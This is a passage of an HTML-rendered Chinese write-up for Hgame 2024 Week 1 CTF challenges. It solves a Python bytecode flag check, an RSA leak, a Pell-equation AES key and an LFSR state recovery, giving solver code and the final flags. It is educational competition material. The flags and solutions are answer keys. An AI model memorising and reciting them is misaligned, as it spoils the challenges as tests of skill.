class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">[Code]</span><br><span class="line">    File Name: ezPYC.py</span><br><span class="line">    Object Name: &lt;module&gt;</span><br><span class="line">    Qualified Name: &lt;module&gt;</span><br><span class="line">    Arg Count: 0</span><br><span class="line">    Pos Only Arg Count: 0</span><br><span class="line">    KW Only Arg Count: 0</span><br><span class="line">    Stack Size: 5</span><br><span class="line">    Flags: 0x00000000</span><br><span class="line">    [Names]</span><br><span class="line">        &#x27;flag&#x27;</span><br><span class="line">        &#x27;c&#x27;</span><br><span class="line">        &#x27;input&#x27;</span><br><span class="line">        &#x27;range&#x27;</span><br><span class="line">        &#x27;i&#x27;</span><br><span class="line">        &#x27;ord&#x27;</span><br><span class="line">        &#x27;print&#x27;</span><br><span class="line">        &#x27;exit&#x27;</span><br><span class="line">    [Locals+Names]</span><br><span class="line">    [Constants]</span><br><span class="line">        (</span><br><span class="line">            87</span><br><span class="line">            75</span><br><span class="line">            71</span><br><span class="line">            69</span><br><span class="line">            83</span><br><span class="line">            121</span><br><span class="line">            83</span><br><span class="line">            125</span><br><span class="line">            117</span><br><span class="line">            106</span><br><span class="line">            108</span><br><span class="line">            106</span><br><span class="line">            94</span><br><span class="line">            80</span><br><span class="line">            48</span><br><span class="line">            114</span><br><span class="line">            100</span><br><span class="line">            112</span><br><span class="line">            112</span><br><span class="line">            55</span><br><span class="line">            94</span><br><span class="line">            51</span><br><span class="line">            112</span><br><span class="line">            91</span><br><span class="line">            48</span><br><span class="line">            108</span><br><span class="line">            119</span><br><span class="line">            97</span><br><span class="line">            115</span><br><span class="line">            49</span><br><span class="line">            112</span><br><span class="line">            112</span><br><span class="line">            48</span><br><span class="line">            108</span><br><span class="line">            100</span><br><span class="line">            37</span><br><span class="line">            124</span><br><span class="line">            2</span><br><span class="line">        )</span><br><span class="line">        (</span><br><span class="line">            1</span><br><span class="line">            2</span><br><span class="line">            3</span><br><span class="line">            4</span><br><span class="line">        )</span><br><span class="line">        &#x27;plz input flag:&#x27;</span><br><span class="line">        0</span><br><span class="line">        36</span><br><span class="line">        1</span><br><span class="line">        4</span><br><span class="line">        &#x27;Sry, try again...&#x27;</span><br><span class="line">        &#x27;Wow!You know a little of python reverse&#x27;</span><br><span class="line">        None</span><br><span class="line">    [Disassembly]</span><br><span class="line">        0       RESUME                        0</span><br><span class="line">        2       BUILD_LIST                    0</span><br><span class="line">        4       LOAD_CONST                    0: (87, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2)</span><br><span class="line">        6       LIST_EXTEND                   1</span><br><span class="line">        8       STORE_NAME                    0: flag</span><br><span class="line">        10      BUILD_LIST                    0</span><br><span class="line">        12      LOAD_CONST                    1: (1, 2, 3, 4)</span><br><span class="line">        14      LIST_EXTEND                   1</span><br><span class="line">        16      STORE_NAME                    1: c</span><br><span class="line">        18      PUSH_NULL                     </span><br><span class="line">        20      LOAD_NAME                     2: input</span><br><span class="line">        22      LOAD_CONST                    2: &#x27;plz input flag:&#x27;</span><br><span class="line">        24      PRECALL                       1</span><br><span class="line">        28      CALL                          1</span><br><span class="line">        38      STORE_NAME                    2: input</span><br><span class="line">        40      PUSH_NULL                     </span><br><span class="line">        42      LOAD_NAME                     3: range</span><br><span class="line">        44      LOAD_CONST                    3: 0</span><br><span class="line">        46      LOAD_CONST                    4: 36</span><br><span class="line">        48      LOAD_CONST                    5: 1</span><br><span class="line">        50      PRECALL                       3</span><br><span class="line">        54      CALL                          3</span><br><span class="line">        64      GET_ITER                      </span><br><span class="line">        66      FOR_ITER                      62 (to 192)</span><br><span class="line">        68      STORE_NAME                    4: i</span><br><span class="line">        70      PUSH_NULL                     </span><br><span class="line">        72      LOAD_NAME                     5: ord</span><br><span class="line">        74      LOAD_NAME                     2: input</span><br><span class="line">        76      LOAD_NAME                     4: i</span><br><span class="line">        78      BINARY_SUBSCR                 </span><br><span class="line">        88      PRECALL                       1</span><br><span class="line">        92      CALL                          1</span><br><span class="line">        102     LOAD_NAME                     1: c</span><br><span class="line">        104     LOAD_NAME                     4: i</span><br><span class="line">        106     LOAD_CONST                    6: 4</span><br><span class="line">        108     BINARY_OP                     6 (%)</span><br><span class="line">        112     BINARY_SUBSCR                 </span><br><span class="line">        122     BINARY_OP                     12 (^)</span><br><span class="line">        126     LOAD_NAME                     0: flag</span><br><span class="line">        128     LOAD_NAME                     4: i</span><br><span class="line">        130     BINARY_SUBSCR                 </span><br><span class="line">        140     COMPARE_OP                    3 (!=)</span><br><span class="line">        146     POP_JUMP_FORWARD_IF_FALSE     21 (to 190)</span><br><span class="line">        148     PUSH_NULL                     </span><br><span class="line">        150     LOAD_NAME                     6: print</span><br><span class="line">        152     LOAD_CONST                    7: &#x27;Sry, try again...&#x27;</span><br><span class="line">        154     PRECALL                       1</span><br><span class="line">        158     CALL                          1</span><br><span class="line">        168     POP_TOP                       </span><br><span class="line">        170     PUSH_NULL                     </span><br><span class="line">        172     LOAD_NAME                     7: exit</span><br><span class="line">        174     PRECALL                       0</span><br><span class="line">        178     CALL                          0</span><br><span class="line">        188     POP_TOP                       </span><br><span class="line">        190     JUMP_BACKWARD                 63</span><br><span class="line">        192     PUSH_NULL                     </span><br><span class="line">        194     LOAD_NAME                     6: print</span><br><span class="line">        196     LOAD_CONST                    8: &#x27;Wow!You know a little of python reverse&#x27;</span><br><span class="line">        198     PRECALL                       1</span><br><span class="line">        202     CALL                          1</span><br><span class="line">        212     POP_TOP                       </span><br><span class="line">        214     LOAD_CONST                    9: None</span><br><span class="line">        216     RETURN_VALUE </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">87, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2</span><br></pre></td></tr></table></figure>
+
+<p>异或1，2，3，4</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1=<span class="built_in">pow</span>(p,q,n)</span><br><span class="line">leak2=<span class="built_in">pow</span>(q,p,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak1=<span class="subst">&#123;leak1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak2=<span class="subst">&#123;leak2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line"><span class="string">leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line"><span class="string">c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>$$<br>\begin{align}<br>p^q\mod pq&#x3D;leak_1\\<br>p^q-kpq&#x3D;leak_1\\<br>p(p^{q-1}-kq)&#x3D;leak_1\\<br>\end{align}<br>$$</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2014.32.17_CgNzkFHFCX.png"></p>
+<p>经检验leak均为素数，说明leak即为p和q</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezMath"><a href="#ezMath" class="headerlink" title="ezMath"></a>ezMath</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span>  x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span> </span><br><span class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>连分数解佩尔方程</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://blog.csdn.net/wh2124335/article/details/8871535" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://blog.csdn.net/wh2124335/article/details/8871535" autofill="title,icon"><div class="left"><span class="title">https://blog.csdn.net/wh2124335/article/details/8871535</span><span class="cap link footnote">https://blog.csdn.net/wh2124335/article/details/8871535</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://gist.github.com/samueltardieu/717308" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://gist.github.com/samueltardieu/717308" autofill="title,icon"><div class="left"><span class="title">https://gist.github.com/samueltardieu/717308</span><span class="cap link footnote">https://gist.github.com/samueltardieu/717308</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pell</span> (D):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return the smallest integer set solving Pell equation</span></span><br><span class="line"><span class="string">    x^2-D*y^2=1 where x, D and y are positive integers. If there are no</span></span><br><span class="line"><span class="string">    solution (D is a square), return None.&gt;&gt;&gt; pell(3)</span></span><br><span class="line"><span class="string">    (2, 1)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a0 = <span class="built_in">int</span> (D**<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> a0*a0 == D: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    gp = [<span class="number">0</span>, a0]</span><br><span class="line">    gq = [<span class="number">1</span>, D-a0**<span class="number">2</span>]</span><br><span class="line">    a = [a0, <span class="built_in">int</span>((a0+gp[<span class="number">1</span>])/gq[<span class="number">1</span>])]</span><br><span class="line">    p = [a[<span class="number">0</span>], a[<span class="number">0</span>]*a[<span class="number">1</span>]+<span class="number">1</span>]</span><br><span class="line">    q = [<span class="number">1</span>, a[<span class="number">1</span>]]</span><br><span class="line">    maxdepth = <span class="literal">None</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> maxdepth <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> n &lt; maxdepth:</span><br><span class="line">        <span class="keyword">if</span> maxdepth <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> a[-<span class="number">1</span>] == <span class="number">2</span>*a[<span class="number">0</span>]:</span><br><span class="line">            r = n-<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> r % <span class="number">2</span> == <span class="number">1</span>: <span class="keyword">return</span> p[r], q[r]</span><br><span class="line">            maxdepth = <span class="number">2</span>*r+<span class="number">1</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        gp.append (a[n-<span class="number">1</span>]*gq[n-<span class="number">1</span>]-gp[n-<span class="number">1</span>])</span><br><span class="line">        gq.append ((D-gp[n]**<span class="number">2</span>)//gq[n-<span class="number">1</span>])</span><br><span class="line">        a.append (<span class="built_in">int</span> ((a[<span class="number">0</span>]+gp[n])//gq[n]))</span><br><span class="line">        p.append (a[n]*p[n-<span class="number">1</span>]+p[n-<span class="number">2</span>])</span><br><span class="line">        q.append (a[n]*q[n-<span class="number">1</span>]+q[n-<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> p[<span class="number">2</span>*r+<span class="number">1</span>], q[<span class="number">2</span>*r+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x,y=pell(<span class="number">114514</span>)</span><br><span class="line">    key = pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">    cipher= AES.new(key,AES.MODE_ECB)</span><br><span class="line">    enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line">    flag=cipher.decrypt(enc)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="ezPRNG"><a href="#ezPRNG" class="headerlink" title="ezPRNG"></a>ezPRNG</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    nextbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        nextbit^=(i%<span class="number">2</span>)</span><br><span class="line">        i=i//<span class="number">2</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+R+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">R=R.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">Rlist=[<span class="built_in">int</span>(R[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line">output=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R=Rlist[i]</span><br><span class="line">    out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        out+=<span class="built_in">str</span>(nextbit)</span><br><span class="line">    output.append(out)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;output=<span class="subst">&#123;output&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-01-31%2014.46.27_iMMPpG2Z2q.png"></p>
+<p>目标是恢复R</p>
+<p>一位一位往前推就可以</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆破位-┐                           res-┐</span><br><span class="line">      v                               v</span><br><span class="line">       ? <span class="number">1111110110111011110000101011010</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">output = [</span><br><span class="line">    <span class="string">&#x27;1111110110111011110000101011010001000111111001111110100101000011110111111100010000111110110111100001001000101101011110111100010010100000011111101101110101011010111000000011110000100011101111011011000100101100110100101110001010001101101110000010001000111100101010010110110111101110011011001011111011010101011000011011000111011011111001101010111100101100110001011010010101110011101001100111000011110111000001101110000001111100000100000101111100010110111001110011010000011011110110011000001101011111111010110011010111010101001000010011110110011110110101011110111010011010010110111111010011101000110101111101111000110011111110010110000100100100101101010101110010101001101010101011110111010011101110000100101111010110101111110001111111110010000000001110011100100001011111110100111011000101001101001110010010001100011000001101000111010010000101101111101011000000101000001110001011001010010001000011000000100010010010010111010011111111011100100100100101111111001110000111110110001111001111100101001001100010&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0010000000001010111100001100011101111101111000100100111010101110010110011001011110101100011101010000001100000110000000011000000110101111111011100100110111011010000100011111000111001000101001110010110010001000110010101011110011101000011111101101011000011110001101011111000110111000011000110011100100101100111100000100100101111001011101110001011011111111011010100010111011000010010101110110100000110100000100010101000010111101001000011000000000111010010101010111101101011111011001000101000100011001100101010110110001010010001010110111011011111101011100111001101111111111010011101111010010011110011111110100110011111110110001000111100010111000101111000011011011111101110101110100111000011100001010110111100011001011010011010111000110101100110100011101101011101000111011000100110110001100110101010110010011011110000111110100111101110000100010000111100010111000010000010001111110110100001000110110100100110110010110111010011111101011110000011101010100110101011110000110101110111011010110110000010000110001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0001101010101010100001001001100010000101010100001010001000100011101100110001001100001001110000110100010101111010110111001101011011101110000011001000100100101000011011101000111001001010011100010001010110111011100100111110111001010010111010100000100111110101110010010110100001000010010001101111001110100010001011101100111011101011101100100101011010101000101001000101110011011111110110011111111100000000011100000010011000110001000110101010001011000010101000110000101001110101010111011010010111011001010011100010101001100110000110101100010000100110101110100001101001011011110011100110011001010110100101010111110110111100000111010001111101110000000000111011011101000011001010010111001110111000100111011110100101000100011011101100011111000101110110110111111001111000000011100011000010000101001011001101110101000010101001000100110010000101001111100101000001011011010011110001101000001101111010100101001100010100000111000011110101010100011011001110001011110111010111011010101101100000110000001010010101111011&#x27;</span>]</span><br><span class="line">mask = <span class="number">0b10001001000010000100010010001001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R, mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i = (R &amp; mask) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    nextbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        nextbit ^= (i % <span class="number">2</span>)</span><br><span class="line">        i = i // <span class="number">2</span></span><br><span class="line">    nextR ^= nextbit</span><br><span class="line">    <span class="keyword">return</span> (nextR, nextbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">    a = i[:<span class="number">31</span>]</span><br><span class="line">    res = <span class="built_in">int</span>(i[<span class="number">31</span>])</span><br><span class="line">    uid=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> PRNG(<span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span> + a, <span class="number">2</span>), mask)[<span class="number">1</span>] == res:</span><br><span class="line">            uid=<span class="string">&#x27;1&#x27;</span>+uid</span><br><span class="line">            a=<span class="string">&#x27;1&#x27;</span>+a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            uid=<span class="string">&#x27;0&#x27;</span>+uid</span><br><span class="line">            a=<span class="string">&#x27;0&#x27;</span>+a</span><br><span class="line">        res=<span class="built_in">int</span>(a[-<span class="number">1</span>])</span><br><span class="line">        a=a[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(uid,<span class="number">2</span>))[<span class="number">2</span>:],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
